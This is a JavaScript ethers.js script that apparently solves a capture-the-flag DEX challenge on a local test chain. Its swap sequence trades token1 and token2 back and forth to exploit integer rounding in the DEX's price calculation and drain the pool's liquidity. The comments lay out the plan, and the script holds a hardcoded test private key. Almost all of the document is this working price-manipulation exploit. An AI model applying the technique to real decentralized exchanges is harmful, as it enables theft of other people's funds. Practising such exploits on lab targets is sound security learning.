const fs = require('fs');
const { ethers, keccak256, toBeHex, zeroPad, BigNumber, zeroPadValue, getBytes } = require('ethers');
const { argv } = require('node:process');

const provider = new ethers.JsonRpcProvider('http://localhost:8545');
const privateKey = '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80';
const wallet = new ethers.Wallet(privateKey, provider);

const abi = JSON.parse(fs.readFileSync('build/Hack.abi', 'utf8'));

// const contractAddress = argv[2];
// const contract = new ethers.Contract(contractAddress, abi, wallet);


// contract.on("Log", (msg,succ) => {
//   console.log("Log:", msg);
// });





// hide all tokens to outside account
// make values of token2 = 10 token1
// keep selling token1 untill done 


  const dexAbi = [
    "function token1() view returns (address)",
    "function token2() view returns (address)",
    "function setTokens(address _token1, address _token2)",
    "function addLiquidity(address token_address, uint256 amount)",
    "function swap(address from, address to, uint256 amount)",
    "function getSwapPrice(address from, address to, uint256 amount) view returns (uint256)",
    "function approve(address spender, uint256 amount)",
    "function balanceOf(address token, address account) view returns (uint256)"
  ];

const IERC20Abi = [
  "event Transfer(address indexed from, address indexed to, uint256 value)",
  "event Approval(address indexed owner, address indexed spender, uint256 value)",
  "function totalSupply() external view returns (uint256)",
  "function balanceOf(address account) external view returns (uint256)",
  "function transfer(address to, uint256 value) external returns (bool)",
  "function allowance(address owner, address spender) external view returns (uint256)",
  "function approve(address spender, uint256 value) external returns (bool)",
  "function transferFrom(address from, address to, uint256 value) external returns (bool)"
];


// he is using integers means i can profit from rounding

async function main() {
  const addr_dex = "0x68923513DEEE122f411DAFC42c9CF86Ca3d230e7";
  const cont_dex = new ethers.Contract(addr_dex,dexAbi,wallet);


  const addr_token1 = await cont_dex.token1();
  const addr_token2 = await cont_dex.token2();

  const cont_token1 = new ethers.Contract(addr_token1,IERC20Abi,wallet);
  const cont_token2 = new ethers.Contract(addr_token2,IERC20Abi,wallet);


  await (await cont_dex.approve(addr_dex,1000)).wait();
  await (await cont_dex.swap(addr_token1,addr_token2,Number.parseInt(await cont_token1.balanceOf(wallet.address)))).wait();
  await (await cont_dex.swap(addr_token2,addr_token1,Number.parseInt(await cont_token2.balanceOf(wallet.address)))).wait();
  await (await cont_dex.swap(addr_token1,addr_token2,Number.parseInt(await cont_token1.balanceOf(wallet.address)))).wait();
  await (await cont_dex.swap(addr_token2,addr_token1,Number.parseInt(await cont_token2.balanceOf(wallet.address)))).wait();
  await (await cont_dex.swap(addr_token1,addr_token2,Number.parseInt(await cont_token1.balanceOf(wallet.address)))).wait();
  await (await cont_dex.swap(addr_token2,addr_token1,45)).wait();
  console.log(Number.parseInt(await cont_token1.balanceOf(wallet.address)),Number.parseInt(await cont_token2.balanceOf(wallet.address)));
  console.log(await cont_token1.balanceOf(addr_dex),await cont_token2.balanceOf(addr_dex));



}

main();




